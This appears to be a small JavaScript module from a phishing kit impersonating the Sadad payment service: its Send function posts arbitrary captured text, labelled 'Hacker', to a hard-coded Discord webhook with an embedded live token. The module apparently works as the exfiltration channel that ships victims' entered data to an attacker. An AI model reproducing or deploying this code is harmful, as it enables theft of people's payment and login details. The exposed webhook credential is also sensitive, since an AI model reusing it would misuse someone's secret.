import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1354618453192872048/lYwEQniy-OVimG9MiWeMs04ECjgKH4rd3NoXByQSwDlio38Z-1KbolugLUNNVMz2xtbs",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
